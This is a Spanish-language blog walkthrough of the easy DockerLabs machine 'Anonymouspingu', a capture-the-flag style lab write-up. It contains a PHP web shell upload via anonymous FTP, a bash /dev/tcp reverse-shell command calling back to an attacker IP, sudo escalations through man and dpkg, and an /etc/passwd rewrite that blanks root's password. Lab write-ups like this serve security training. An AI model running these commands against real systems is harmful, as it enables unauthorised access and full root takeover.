---
layout: post
title: "Anonymouspingu"
date: 2024-09-02
 14:20:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Anonymouspingu </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/dockerlabs/anonymouspingu/host.png){:.margin}

**1\.** Descubriendo puertos y servicios de la maquina.

`sudo nmap -p- --open --min-rate=5000 -sCV -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/anonymouspingu/nmap.png){:.margin}

**2\.** Vamos a revisar la web, si clickamos en "acceder al backend" nos lleva a la ruta de "upload" el cual esta vacio.

`http://172.17.0.2/`

![img](/notas/public/img/dockerlabs/anonymouspingu/80.png){:.margin}
![img](/notas/public/img/dockerlabs/anonymouspingu/80upload.png){:.margin}

**3\.** Ingreso al ftp como anonimo, vemos que el directorio upload tiene los permisos, creamos una shell y lo subimos al servidor.

`nvim shell.php`

`ftp 172.17.0.2`

`dir`

`cd upload`

`put shell.php`

![img](/notas/public/img/dockerlabs/anonymouspingu/ftp.png){:.margin}

**4\.** Ahora desde el navegador tenemos una web shell, nos ponemos en escucha por nc y obtenemos la reverse shell.

`nc -nlvp 4000`

`http://172.17.0.2/upload/shell.php?cmd=bash -c 'bash -i>%26 /dev/tcp/192.168.18.8/4000 0>%261'`

![img](/notas/public/img/dockerlabs/anonymouspingu/nc.png){:.margin}

**5\.** Podemos ejecutar el binario man como el usuario pingu sin proporcionar contraseña.

`sudo -l`

![img](/notas/public/img/dockerlabs/anonymouspingu/sudol.png){:.margin}

**6\.** Hacemos tratamiento de la tty.

`script /dev/null -c bash`

`stty raw -echo;fg`

`reset xterm`

`export TERM=xterm`

`export SHELL=/bin/bash`

![img](/notas/public/img/dockerlabs/anonymouspingu/stty.png){:.margin}
![img](/notas/public/img/dockerlabs/anonymouspingu/stty2.png){:.margin}

**7\.** Obtenemos una bash como pingu; referencia [gtfobins](https://gtfobins.github.io/gtfobins/man/#sudo).

`sudo -u pingu /usr/bin/man man`

`!/bin/bash`

![img](/notas/public/img/dockerlabs/anonymouspingu/bashpingu.png){:.margin}

**8\.** Ya estando como pingu, revisando los permisos sudo de este usuario tenemos dos binarios, que podemos ejecutarlos como gladys.

`sudo -l`

![img](/notas/public/img/dockerlabs/anonymouspingu/sudolpingu.png){:.margin}

**9\.** Obtenemos la bash como gladys; referencia [gtfobins](https://gtfobins.github.io/gtfobins/dpkg/#sudo).

`sudo -u gladys /usr/bin/dpkg -l`

`!/bin/bash`

![img](/notas/public/img/dockerlabs/anonymouspingu/bashgladys.png){:.margin}

**10\.** Tenemos un binario que podemos ejecutarlo como root, revisamos el passwd, vemos que el propietario puede escribir en el archivo.

`sudo -l`

`ls -l /etc/passwd`

![img](/notas/public/img/dockerlabs/anonymouspingu/sudolgladys.png){:.margin}

**11\.** Escalando privilegios.

_11.1- Primero asignamos a gladys como propietario del passwd_

`sudo /usr/bin/chown gladys:gladys /etc/passwd`

![img](/notas/public/img/dockerlabs/anonymouspingu/chown.png){:.margin}

_11.2- Copiamos todo el passwd y borramos la X que indica la contraseña habilitada de root y lo redirigmos al passwd_

`echo 'root::0..........' > /etc/passwd`

`grep root /etc/passwd`

![img](/notas/public/img/dockerlabs/anonymouspingu/passwd.png){:.margin}

_11.3- Migramos a root_

`su root`

![img](/notas/public/img/dockerlabs/anonymouspingu/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>